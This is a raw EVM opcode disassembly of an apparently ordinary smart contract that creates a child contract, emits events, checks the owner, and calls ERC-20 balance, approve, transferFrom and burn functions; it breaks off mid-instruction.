PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP SWAP1 POP POP PUSH32 0x6559452B5CF88E12990371C9441273D2DBB464FB7DD9CC4030551B86DF924B62 DUP2 PUSH1 0x0 ADD SLOAD DUP3 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH1 0x2 ADD SLOAD PUSH1 0x40 MLOAD PUSH3 0xBAD SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x20DA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x1 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH3 0xBCA SWAP1 PUSH3 0x1EEB JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH3 0xBD9 PUSH3 0x132C JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x6 PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 PUSH1 0x8 PUSH1 0x0 DUP6 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0xC71 SWAP2 SWAP1 PUSH3 0x1E16 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH3 0xC8F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0xCB5 SWAP2 SWAP1 PUSH3 0x212E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x8 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP DUP1 PUSH1 0x0 ADD SLOAD SWAP1 DUP1 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 DUP1 PUSH1 0x2 ADD SLOAD SWAP1 DUP1 PUSH1 0x3 ADD SLOAD SWAP1 DUP1 PUSH1 0x4 ADD SLOAD SWAP1 DUP1 PUSH1 0x5 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP DUP7 JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0xDAD JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x9 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH1 0x1 DUP2 GT ISZERO PUSH3 0xDD2 JUMPI PUSH3 0xDD1 PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP2 GT ISZERO PUSH3 0xDE9 JUMPI PUSH3 0xDE8 PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST SUB PUSH3 0xE21 JUMPI PUSH1 0x40 MLOAD PUSH32 0x6668065E00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x9 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0x1 DUP2 GT ISZERO PUSH3 0xE4A JUMPI PUSH3 0xE49 PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST MUL OR SWAP1 SSTORE POP DUP3 PUSH1 0x2 DUP2 SWAP1 SSTORE POP DUP2 PUSH1 0x5 DUP2 SWAP1 SSTORE POP PUSH32 0x0 PUSH1 0x0 DUP2 SWAP1 SSTORE POP DUP3 PUSH1 0x4 DUP2 SWAP1 SSTORE POP TIMESTAMP PUSH1 0x3 DUP2 SWAP1 SSTORE POP PUSH1 0x2 SLOAD ADDRESS PUSH1 0x40 MLOAD PUSH3 0xEA4 SWAP1 PUSH3 0x1B7D JUMP JUMPDEST PUSH3 0xEB1 SWAP3 SWAP2 SWAP1 PUSH3 0x2160 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH3 0xECE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x6 PUSH1 0x1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x6 PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x7 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH32 0xF0EB7CC9CDE5623ECDC8F18C7FE6BACAB47AB80468F73B4D9B3D08EC7284AF5 PUSH1 0x3 SLOAD PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x2 SLOAD PUSH1 0x5 SLOAD PUSH1 0x40 MLOAD PUSH3 0xFD1 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x218D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x108C JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x111A JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x11C0 JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x6 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH3 0x1302 JUMPI PUSH1 0x5 SLOAD PUSH1 0x3C PUSH1 0x3 SLOAD TIMESTAMP PUSH3 0x1208 SWAP2 SWAP1 PUSH3 0x1FBB JUMP JUMPDEST PUSH3 0x1214 SWAP2 SWAP1 PUSH3 0x2209 JUMP JUMPDEST PUSH3 0x1220 SWAP2 SWAP1 PUSH3 0x2241 JUMP JUMPDEST PUSH32 0x0 PUSH3 0x124D SWAP2 SWAP1 PUSH3 0x22C5 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SGT ISZERO DUP1 PUSH3 0x1287 JUMPI POP PUSH32 0x0 PUSH1 0x0 SLOAD SGT ISZERO JUMPDEST ISZERO PUSH3 0x12B5 JUMPI PUSH32 0x0 PUSH1 0x0 DUP2 SWAP1 SSTORE POP JUMPDEST PUSH32 0x7CDA8554820EF0A356899263AEFA9DB86AB6966B7B823EDA047B78C3AFDFEB8E PUSH1 0x3 SLOAD TIMESTAMP PUSH3 0x12E6 SWAP2 SWAP1 PUSH3 0x1FBB JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH3 0x12F9 SWAP3 SWAP2 SWAP1 PUSH3 0x230F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMPDEST JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH3 0x1336 PUSH3 0x11DE JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP PUSH1 0x0 JUMPDEST PUSH1 0x1 SLOAD DUP2 LT ISZERO PUSH3 0x15E0 JUMPI PUSH1 0x0 SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH3 0x1371 SWAP2 SWAP1 PUSH3 0x2209 JUMP JUMPDEST DUP3 LT PUSH3 0x140F JUMPI PUSH1 0x0 SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH3 0x139E SWAP2 SWAP1 PUSH3 0x2209 JUMP JUMPDEST PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD DUP2 SWAP1 SSTORE POP PUSH1 0x0 SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH3 0x13DE SWAP2 SWAP1 PUSH3 0x2209 JUMP JUMPDEST DUP3 PUSH3 0x13EB SWAP2 SWAP1 PUSH3 0x1FBB JUMP JUMPDEST SWAP2 POP PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD DUP2 SWAP1 SSTORE POP PUSH3 0x152B JUMP JUMPDEST PUSH1 0x0 DUP3 GT DUP1 ISZERO PUSH3 0x1444 JUMPI POP PUSH1 0x0 SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH3 0x1441 SWAP2 SWAP1 PUSH3 0x2209 JUMP JUMPDEST DUP3 LT JUMPDEST ISZERO PUSH3 0x14D2 JUMPI DUP2 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP2 POP PUSH1 0x0 SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD PUSH3 0x148F SWAP2 SWAP1 PUSH3 0x233C JUMP JUMPDEST PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH3 0x14B2 SWAP2 SWAP1 PUSH3 0x1FBB JUMP JUMPDEST PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD DUP2 SWAP1 SSTORE POP PUSH3 0x152A JUMP JUMPDEST PUSH1 0x0 DUP3 GT PUSH3 0x1529 JUMPI PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD DUP2 SWAP1 SSTORE POP PUSH1 0x8 PUSH1 0x0 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x2 ADD SLOAD PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD DUP2 SWAP1 SSTORE POP JUMPDEST JUMPDEST JUMPDEST PUSH32 0xB24B09FD2E8E4D8904C3C26F3E935824E032891520FFDA419DEC9F086B0E1EEA PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x8 PUSH1 0x0 DUP5 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD PUSH1 0x8 PUSH1 0x0 DUP6 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x4 ADD SLOAD PUSH1 0x40 MLOAD PUSH3 0x15C2 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x1E7F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 DUP1 DUP1 PUSH3 0x15D7 SWAP1 PUSH3 0x1EEB JUMP JUMPDEST SWAP2 POP POP PUSH3 0x1340 JUMP JUMPDEST POP PUSH1 0x0 DUP2 GT ISZERO PUSH3 0x15F8 JUMPI DUP1 PUSH1 0x4 DUP2 SWAP1 SSTORE POP PUSH3 0x164A JUMP JUMPDEST PUSH1 0x1 PUSH1 0x9 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0x1 DUP2 GT ISZERO PUSH3 0x1621 JUMPI PUSH3 0x1620 PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST MUL OR SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x4 DUP2 SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x6 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x16D5 JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH3 0x1765 JUMPI PUSH1 0x40 MLOAD PUSH32 0xAE4A21BC00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 JUMPDEST PUSH1 0x1 SLOAD DUP2 LT ISZERO PUSH3 0x1A49 JUMPI PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD GT ISZERO PUSH3 0x1A33 JUMPI PUSH1 0x6 PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 PUSH1 0x8 PUSH1 0x0 DUP5 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH8 0xDE0B6B3A7640000 PUSH1 0x8 PUSH1 0x0 DUP7 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD PUSH3 0x183C SWAP2 SWAP1 PUSH3 0x233C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x185B SWAP3 SWAP2 SWAP1 PUSH3 0x2387 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH3 0x187B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x18A1 SWAP2 SWAP1 PUSH3 0x23E5 JUMP JUMPDEST POP PUSH1 0x6 PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD ADDRESS PUSH1 0x8 PUSH1 0x0 DUP6 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH8 0xDE0B6B3A7640000 PUSH1 0x8 PUSH1 0x0 DUP8 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD PUSH3 0x1944 SWAP2 SWAP1 PUSH3 0x233C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x1964 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x2417 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH3 0x1984 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH3 0x19AA SWAP2 SWAP1 PUSH3 0x23E5 JUMP JUMPDEST POP PUSH32 0x39B13884CBCEA684931B2BCFF6FAAB7170693E1BC173E651E14168C890C7080 PUSH1 0x8 PUSH1 0x0 DUP4 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x1 ADD PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x8 PUSH1 0x0 DUP5 DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x3 ADD SLOAD PUSH1 0x40 MLOAD PUSH3 0x1A2A SWAP3 SWAP2 SWAP1 PUSH3 0x2387 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMPDEST DUP1 DUP1 PUSH3 0x1A40 SWAP1 PUSH3 0x1EEB JUMP JUMPDEST SWAP2 POP POP PUSH3 0x1770 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x9 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0x1 DUP2 GT ISZERO PUSH3 0x1A75 JUMPI PUSH3 0x1A74 PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST MUL OR SWAP1 SSTORE POP PUSH3 0x1A84 PUSH3 0x132C JUMP JUMPDEST PUSH3 0x1A8E PUSH3 0x4D8 JUMP JUMPDEST PUSH3 0x1A98 PUSH3 0x176D JUMP JUMPDEST PUSH1 0x0 PUSH1 0x4 SLOAD GT ISZERO PUSH3 0x1B3A JUMPI PUSH1 0x6 PUSH1 0x1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x9DC29FAC ADDRESS PUSH1 0x4 SLOAD PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH3 0x1B05 SWAP3 SWAP2 SWAP1 PUSH3 0x2387 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH3 0x1B20 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH3 0x1B35 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH32 0x99D9AED25B1415A4A35A1890D2EE6AA1DB28F98BA8EFF1DE3D494A6AF9DCA772 PUSH1 0x1 SLOAD PUSH1 0x4 SLOAD SELFBALANCE PUSH1 0x40 MLOAD PUSH3 0x1B73 SWAP4 SWAP3 SWAP2 SWAP1 PUSH3 0x2454 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMP JUMPDEST PUSH2 0x1EF0 DUP1 PUSH3 0x2492 DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x21 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x2 DUP2 LT PUSH3 0x1BCE JUMPI PUSH3 0x1BCD PUSH3 0x1B8B JUMP JUMPDEST JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP PUSH3 0x1BE1 DUP3 PUSH3 0x1BBA JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1BF3 DUP3 PUSH3 0x1BD1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x1C05 DUP2 PUSH3 0x1BE6 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0x1C22 PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0x1BFA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x1C3D DUP2 PUSH3 0x1C28 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 0x1C5A PUSH1 0x0 DUP4 ADD DUP5 PUSH3 0x1C32 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x1C75 DUP2 PUSH3 0x1C60 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH3 